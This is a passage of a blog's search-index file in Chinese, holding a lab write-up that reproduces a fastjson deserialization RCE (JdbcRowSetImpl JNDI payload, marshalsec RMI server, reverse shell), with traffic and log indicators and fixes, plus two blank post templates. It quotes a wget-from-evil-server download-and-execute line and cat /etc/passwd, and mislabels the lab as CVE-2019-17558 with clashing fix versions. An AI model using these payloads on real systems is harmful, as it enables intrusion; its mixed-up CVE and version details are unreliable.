反序列化时，这个功能允许根据 JSON 数据中的 @type 字段来确定要反序列化的具体 Java 类，从而为漏洞利用创造了条件。</p><p>反序列化类未受严格限制：应用程序在使用 fastjson 进行反序列化操作时，没有对反序列化的类进行严格的白名单限制。这使得攻击者能够构造包含恶意类（如具有 JNDI 注入能力的类，如 com.sun.rowset.JdbcRowSetImpl 等）的 JSON 数据，在反序列化过程中加载并实例化这些恶意类。</p><p>使用的 fastjson 版本：漏洞存在于 fastjson 1.2.24 及以下版本中。如果应用程序没有及时将 fastjson 库升级到安全版本（1.2.25 及以上），就容易受到该反序列化 RCE 漏洞的影响。</p><h2 id="🧪-漏洞复现"><a href="#🧪-漏洞复现" class="headerlink" title="🧪 漏洞复现"></a>🧪 漏洞复现</h2><h6 id="1-拉取CVE-2019-17558复现环境"><a href="#1-拉取CVE-2019-17558复现环境" class="headerlink" title="1.拉取CVE-2019-17558复现环境"></a>1.拉取CVE-2019-17558复现环境</h6><p>在靶机对应的漏洞文件夹下运行docker compose up</p><p>运行docker ps可查看容器运行情况</p><p><img src="/img/wps2.jpg" alt="img"> </p><p>由图可知，容器成功运行在本机8090端口</p><p><strong>2.编译反弹shell代码</strong></p><p>在本地写一个test.java</p><p><img src="/img/wps3.jpg" alt="img"> </p><p>将shell反弹到本机4563端口</p><p>在Java8环境中编译test.java并上传到服务器</p><p><img src="/img/wps4.jpg" alt="img"> </p><p>随后开启http服务，将爆破代码上传****pyton -m http.server 5623****</p><p><img src="/img/wps5.jpg" alt="img"> </p><p>访问端口发现其成功运行</p><p><img src="/img/wps6.jpg" alt="img"> </p><p><strong>3.部署rmi服务</strong></p><p>在github上获取****marshalsec-0.0.3–SHOT-all.jar****</p><p>链接为<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p>运行以下命令</p><p>java -cp marshalsec-0.0.3–SHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://47.96.99.165:5623/#test">http://47.96.99。165:5623/#test</a>“ 8653</p><p><img src="/img/wps7.jpg" alt="img"> </p><ol start="4"><li><strong>构造playload进行攻击</strong></li></ol><p><img src="/img/wps8.jpg" alt="img"> </p><p>观察端口回显</p><p><img src="/img/wps9.jpg" alt="img"> </p><p>发现5623端口目录被访问</p><p><img src="/img/wps10.jpg" alt="img"> </p><p>8653端口的rmi服务启动并被执行</p><p><img src="/img/wps11.jpg" alt="img"> </p><p>监听的4563端口成功反弹shell</p><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><p>流量分析</p><p><img src="/img/image-20250817175049808.png" alt="image-20250817175049808"></p><h6 id="特殊的-JSON-数据格式："><a href="#特殊的-JSON-数据格式：" class="headerlink" title="特殊的 JSON 数据格式："></a>特殊的 JSON 数据格式：</h6><p>流量包中会包含精心构造的 JSON 数据，这些数据通常包含 @type 字段，用于指定要反序列化的类。例如：”@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>          “dataSourceName”:”rmi:&#x2F;&#x2F;192.168.0.1:8653&#x2F;test”,<br>          “autoCommit”:true</p><h6 id="JNDI-相关的请求："><a href="#JNDI-相关的请求：" class="headerlink" title="JNDI 相关的请求："></a>JNDI 相关的请求：</h6><p>由于漏洞利用常借助 JNDI（Java 命名和目录接口）注入来实现远程代码执行，流量包中会出现与 JNDI 相关的请求。比如，会有向恶意 LDAP 服务器（如数据中 dataSourceName 指定的地址）发起的请求，以获取恶意类或资源。这些请求的目标地址通常是攻击者控制的服务器，并且请求的协议为 LDAP 协议（端口一般为 389 或攻击者自定义的端口，如 1389 等）。</p><h6 id="异常的请求头和内容类型："><a href="#异常的请求头和内容类型：" class="headerlink" title="异常的请求头和内容类型："></a>异常的请求头和内容类型：</h6><p>一般来说，使用 fastjson 进行数据交互的请求会有特定的请求头，比如 Content-Type: application&#x2F;json。但在攻击过程中，除了正常的 JSON 数据传输特征外，由于恶意构造的存在，请求的内容可能会包含一些不常见或不符合正常业务逻辑的字段和值。</p><h6 id="频繁的请求模式："><a href="#频繁的请求模式：" class="headerlink" title="频繁的请求模式："></a>频繁的请求模式：</h6><p>攻击者在尝试利用漏洞时，可能会发送多个不同的请求来测试和验证漏洞是否存在，或者进行一系列的操作来完成整个攻击流程。因此，流量包中可能会出现相对频繁且具有一定规律的请求模式，与正常的业务请求模式不同。</p><h6 id="数据传输量异常："><a href="#数据传输量异常：" class="headerlink" title="数据传输量异常："></a>数据传输量异常：</h6><p>与正常业务数据传输相比，包含恶意 JSON 数据的流量包可能会在数据量上表现出异常。因为恶意构造的数据可能包含较长的类名、复杂的参数值（如恶意的 dataSourceName 地址）等，导致传输的数据量比正常情况大。</p><h6 id="请求来源异常："><a href="#请求来源异常：" class="headerlink" title="请求来源异常："></a>请求来源异常：</h6><p>如果应用系统有固定的访问来源或正常的业务访问模式，而攻击流量的来源可能来自一些不常见的 IP 地址或地理位置，这也可以作为一个攻击特征在流量包中体现出来。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志特征</p><p><img src="/img/image-20250817175206768.png" alt="image-20250817175206768"></p><p>异常请求记录：有与正常请求不同的 POST 请求记录，请求路径可能是应用中与 Fastjson 解析相关的接口。并且请求体中包含恶意构造的 JSON 数据，例如{“b”:{“@type”:”com.sun.rowset.jdbcrowsetimpl”,”datasourcename”:”rmi:&#x2F;&#x2F;192.168.142.133:1099&#x2F;tmhawa”,”autocommit”:true}}，这是利用漏洞尝试连接远程 RMI 服务器以执行恶意代码的典型特征。</p><p>频繁请求：可能出现来自同一 IP 地址或不同 IP 地址的大量相似请求，都试图利用漏洞执行不同的恶意操作，如多次尝试连接不同的远程服务器或执行不同的命令。</p><p>系统命令执行日志：如果攻击者成功利用漏洞执行了系统命令，Docker 日志中可能会出现相应的命令执行记录以及执行结果。比如执行touch &#x2F;tmp&#x2F;test命令来创建一个测试文件，日志中可能会有类似Executing command: touch &#x2F;tmp&#x2F;test的记录，或者是执行cat &#x2F;etc&#x2F;passwd命令读取用户信息，也会有相应的记录显示。</p><p>类加载错误：由于攻击者构造的恶意 JSON 数据可能尝试加载不存在或无权限访问的类，Fastjson 在解析时可能会产生类加载错误日志。例如，日志中出现ClassNotFoundException: com.sun.rowset.jdbcrowsetimpl等类似的错误信息，提示找不到指定的类。</p><p>连接错误：当攻击者尝试连接远程 RMI 服务器时，如果服务器不存在、端口未开放或网络连接有问题，会产生连接错误日志。如java.rmi.ConnectException: Connection refused to host: 192.168.142.133; nested exception is: java.net.ConnectException: Connection refused，表明无法连接到指定的远程服务器。</p><h2 id="漏洞利用行为总结"><a href="#漏洞利用行为总结" class="headerlink" title="漏洞利用行为总结"></a>漏洞利用行为总结</h2><p>针对漏洞利用过程中的流量和服务器日志进行发现，总结漏洞利用过程中行为特征如下：<br>构造恶意 JSON 数据：攻击者会构造包含特定类和方法调用的 JSON 数据，利用 Fastjson 的反序列化机制，将 JSON 数据转换为 Java 对象时执行恶意代码。例如，利用com.sun.rowset.JdbcRowSetImpl类的特性，通过设置datasourcename属性来指定远程 RMI 服务器地址和端口，尝试连接远程服务器并执行恶意代码。</p><p>发送恶意请求：攻击者将构造好的恶意 JSON 数据通过 HTTP 请求发送到使用 Fastjson 进行 JSON 解析的目标应用程序接口。这通常是一个 POST 请求，请求体中包含恶意 JSON 数据，Content - Type 设置为application&#x2F;json。</p><p>触发反序列化漏洞：目标应用程序接收到请求后，使用 Fastjson 对请求体中的 JSON 数据进行反序列化处理。由于 Fastjson 在反序列化过程中没有对输入进行充分的验证和过滤，导致恶意代码被执行。</p><p>执行恶意代码：一旦反序列化过程被利用，攻击者可以执行任意代码，如连接远程服务器下载并执行恶意软件、读取或篡改服务器上的敏感文件、获取系统权限等。例如，攻击者可以利用漏洞执行系统命令，如cat &#x2F;etc&#x2F;passwd读取用户信息，或通过执行wget <a href="http://evil/">http://evil</a> - server &#x2F; malicious - file &amp;&amp; chmod + x malicious - file &amp;&amp;.&#x2F;malicious - file下载并执行恶意文件。</p><h2 id="🛡️-修复方案"><a href="#🛡️-修复方案" class="headerlink" title="🛡️ 修复方案"></a>🛡️ 修复方案</h2><p>升级 Fastjson 版本：将 Fastjson 升级到官方修复该漏洞的版本，建议使用 1.2.47 及以上版本。在升级前，需全面评估应用程序与新版本 Fastjson 的兼容性，可在测试环境中进行充分测试，确保升级后应用程序能正常运行。</p><p>输入验证与过滤：对接收的 JSON 数据进行严格的输入验证和过滤，阻止包含恶意类名、方法名或特定关键词的 JSON 数据进入反序列化流程。可以使用正则表达式或其他验证机制，检查 JSON 数据中的类名是否在允许的白名单内，防止非法类被反序列化。</p><p>安全配置 Fastjson：配置 Fastjson 的反序列化特性，限制反序列化的类范围，只允许特定的、信任的类进行反序列化。同时，禁用自动类型转换等可能存在风险的功能，降低漏洞被利用的可能性。例如，在使用 Fastjson 解析 JSON 数据时，通过设置ParserConfig来指定允许反序列化的类。</p><p>及时关注安全公告：关注 Fastjson 官方的安全公告和更新信息，及时了解并处理新发现的安全问题。建立安全信息收集机制，以便在出现新漏洞时能快速响应并采取相应的修复措施。</p><p>安全编码规范：开发人员应遵循安全编码规范，避免在代码中出现可被利用的安全隐患。例如，避免直接使用用户输入来构造反序列化对象，对不可信的输入进行充分的净化和验证。同时，定期进行代码审查，检查是否存在潜在的安全漏洞。</p><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><p><a href="https://www.cnblogs.com/Junglezt/p/18137413">https://www.cnblogs.com/Junglezt/p/18137413</a></p><h2 id="💡-总结与启示"><a href="#💡-总结与启示" class="headerlink" title="💡 总结与启示"></a>💡 总结与启示</h2><p>这是24年上半年复现的洞了，现在搞个博客才发，就当简单记录和复习了</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>安全研究</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【项目名称】- 安全工具/系统开发实践</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📋-项目概述"><a href="#📋-项目概述" class="headerlink" title="📋 项目概述"></a>📋 项目概述</h2><p>简要介绍该安全项目的基本情况，包括项目目标、解决的问题和应用场景。</p><span id="more"></span><h2 id="🎯-项目背景"><a href="#🎯-项目背景" class="headerlink" title="🎯 项目背景"></a>🎯 项目背景</h2><h3 id="项目起源"><a href="#项目起源" class="headerlink" title="项目起源"></a>项目起源</h3><p>描述项目的起源和开发动机。</p><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>详细说明该项目要解决的具体安全问题。</p><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><p>介绍项目使用的主要技术栈和选型理由。</p><h2 id="🏗️-系统架构"><a href="#🏗️-系统架构" class="headerlink" title="🏗️ 系统架构"></a>🏗️ 系统架构</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>描述系统的整体架构设计。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[架构图或流程图]</span><br></code></pre></td></tr></table></figure><h3 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h3><ul><li>模块1：功能描述</li><li>模块2：功能描述</li><li>模块3：功能描述</li></ul><h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h3><p>详细介绍项目中使用的关键技术和实现方法。</p><h2 id="💻-核心代码实现"><a href="#💻-核心代码实现" class="headerlink" title="💻 核心代码实现"></a>💻 核心代码实现</h2><h3 id="模块1实现"><a href="#模块1实现" class="headerlink" title="模块1实现"></a>模块1实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心代码示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_function</span>():<br>    <span class="hljs-comment"># 实现逻辑</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模块1功能实现&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="模块2实现"><a href="#模块2实现" class="headerlink" title="模块2实现"></a>模块2实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心代码示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">another_function</span>():<br>    <span class="hljs-comment"># 实现逻辑</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模块2功能实现&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="📊-项目效果"><a href="#📊-项目效果" class="headerlink" title="📊 项目效果"></a>📊 项目效果</h2><h3 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h3><p>描述项目的主要功能和效果。</p><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><table><thead><tr><th>指标</th><th>数值</th><th>说明</th></tr></thead><tbody><tr><td>指标1</td><td>XX</td><td>说明</td></tr><tr><td>指标2</td><td>XX</td><td>说明</td></tr><tr><td>指标3</td><td>XX</td><td>说明</td></tr></tbody></table><h3 id="实际应用案例"><a href="#实际应用案例" class="headerlink" title="实际应用案例"></a>实际应用案例</h3><p>分享项目在实际场景中的应用案例。</p><h2 id="🔧-部署指南"><a href="#🔧-部署指南" class="headerlink" title="🔧 部署指南"></a>🔧 部署指南</h2><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><ul><li>操作系统：XXX</li><li>依赖组件：XXX</li><li>硬件要求：XXX</li></ul><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol><li>第一步</li><li>第二步</li><li>第三步</li></ol><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 配置文件示例</span><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>  <br><span class="hljs-attr">security:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="🚀-使用指南"><a href="#🚀-使用指南" class="headerlink" title="🚀 使用指南"></a>🚀 使用指南</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>描述项目的基本使用方法。</p><h3 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h3><p>介绍项目的高级功能和使用技巧。</p><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><p>列出使用过程中可能遇到的常见问题和解决方法。</p><h2 id="📈-项目展望"><a href="#📈-项目展望" class="headerlink" title="📈 项目展望"></a>📈 项目展望</h2><h3 id="当前不足"><a href="#当前不足" class="headerlink" title="当前不足"></a>当前不足</h3><p>分析项目目前存在的不足和限制。</p><h3 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h3><p>介绍项目的未来发展计划和方向。</p><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://example.com/">参考资料1</a></li><li><a href="https://example.com/">参考资料2</a></li><li><a href="https://github.com/example">开源项目地址</a></li></ul><h2 id="💡-总结与心得"><a href="#💡-总结与心得" class="headerlink" title="💡 总结与心得"></a>💡 总结与心得</h2><p>分享项目开发过程中的心得体会和经验总结。</p>]]></content>
    
    
    <categories>
      
      <category>安全项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
      <tag>开发实践</tag>
      
      <tag>项目分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【漏洞编号】- 【漏洞名称】深度分析</title>
    <link href="/2023/10/18/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📢-漏洞概述"><a href="#📢-漏洞概述" class="headerlink" title="📢 漏洞概述"></a>📢 漏洞概述</h2><p>简要介绍该漏洞的基本情况，包括漏洞类型、影响范围、CVSS评分等。</p><span id="more"></span><h2 id="🔎-漏洞详情"><a href="#🔎-漏洞详情" class="headerlink" title="🔎 漏洞详情"></a>🔎 漏洞详情</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><table><thead><tr><th>项目</th><th>详情</th></tr></thead><tbody><tr><td>漏洞编号</td><td>CVE-20XX-XXXXX</td></tr><tr><td>披露时间</td><td>20XX年XX月XX日</td></tr><tr><td>影响版本</td><td>X.X.X - X.X.X</td></tr><tr><td>漏洞评级</td><td>严重&#x2F;高危&#x2F;中危&#x2F;低危</td></tr><tr><td>修复版本</td><td>X.X.X</td></tr></tbody></table><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>详细分析漏洞产生的技术原因，包括代码缺陷、设计缺陷等。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>受影响的系统</li><li>受影响的组件</li><li>受影响的用户群体</li></ul><h2 id="💻-漏洞分析"><a href="#💻-漏洞分析" class="headerlink" title="💻 漏洞分析"></a>💻 漏洞分析</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 有漏洞的代码片段</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">10</span>];<br>    gets(buffer);  <span class="hljs-comment">// 缓冲区溢出漏洞</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h3><p>详细描述触发漏洞所需的条件和环境。</p><h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>分析漏洞可能的利用方式和攻击向量。</p><h2 id="🧪-漏洞复现"><a href="#🧪-漏洞复现" class="headerlink" title="🧪 漏洞复现"></a>🧪 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>详细说明如何搭建漏洞复现环境。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><ol><li>第一步</li><li>第二步</li><li>第三步</li></ol><h3 id="漏洞利用代码"><a href="#漏洞利用代码" class="headerlink" title="漏洞利用代码"></a>漏洞利用代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 漏洞利用PoC</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit_vulnerability</span>():<br>    payload = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">20</span>  <span class="hljs-comment"># 构造溢出数据</span><br>    <span class="hljs-comment"># 发送payload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发送漏洞利用载荷...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="🛡️-修复方案"><a href="#🛡️-修复方案" class="headerlink" title="🛡️ 修复方案"></a>🛡️ 修复方案</h2><h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><p>分析官方发布的修复方案和补丁。</p><h3 id="临时缓解措施"><a href="#临时缓解措施" class="headerlink" title="临时缓解措施"></a>临时缓解措施</h3><p>在无法立即应用补丁的情况下可采取的临时措施。</p><h3 id="最佳实践建议"><a href="#最佳实践建议" class="headerlink" title="最佳实践建议"></a>最佳实践建议</h3><p>预防类似漏洞的最佳实践和安全建议。</p><h2 id="📊-时间线"><a href="#📊-时间线" class="headerlink" title="📊 时间线"></a>📊 时间线</h2><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>20XX-XX-XX</td><td>漏洞被发现</td></tr><tr><td>20XX-XX-XX</td><td>漏洞报告给厂商</td></tr><tr><td>20XX-XX-XX</td><td>厂商确认漏洞</td></tr><tr><td>20XX-XX-XX</td><td>补丁发布</td></tr><tr><td>20XX-XX-XX</td><td>漏洞公开</td></tr></tbody></table><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://cve.mitre.org/">CVE详情</a></li><li><a href="https://example.com/">厂商公告</a></li><li><a href="https://example.com/">技术分析文章</a></li></ul><h2 id="💡-总结与启示"><a href="#💡-总结与启示" class="headerlink" title="💡 总结与启示"></a>💡 总结与启示</h2><p>对该漏洞的总结评价和安全启示。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>安全研究</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
